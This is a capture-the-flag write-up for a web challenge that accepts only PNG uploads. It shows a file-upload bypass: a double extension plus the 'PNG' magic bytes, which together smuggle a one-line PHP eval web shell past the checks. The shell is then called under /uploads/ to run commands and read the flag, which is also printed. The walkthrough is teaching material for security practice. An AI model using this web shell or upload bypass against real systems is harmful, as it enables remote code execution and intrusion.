## Challenge Discription 

`I found a web app that can help process images: PNG images only!`

## Intuition 

This challenge is asking us to upload a PNG file. This just sounds like php shell to me. so that's what I tried. 
## What I tried at first

### Uploading a php file
This returned with `Error: File name does not contain '.png'.`
meaning one of the ways of verifying the file is checking if it contains '.png'
### Renaming the php file
by renaming it with the name 1.png.php, it still turned out to be unsuccessful, it displayed an error `Error: The file is not a valid PNG image: 3c3f7068` 

## Solution
By checking the robots.txt file, it displays as following 
```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/ 
```
this told us where the uploaded file might be at and there's an interesting file called instructions.txt

checking the instructions.txt gives us 

```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```

this tells us that the webapp will check the magic bytes of the file, so we simply change our 1.png.php file to the following code
```
PNG
<?php @eval($_POST['cmd']); ?>
```

then upload this file to the app, we can find it uploaded successfully. 

then we simply had to access the webshell at .../uploads/1.png.php?cmd=(command)
to gain remote access. 

after navigating the directories, we can find an interesting file at the directory /var/www/html/MQ4WCNZUHFQTI.txt

and this txt file will have our flag

#### Flag: academy{c3rt!fi3d_Xp3rt_tr1ckst3r_d9a749a4}
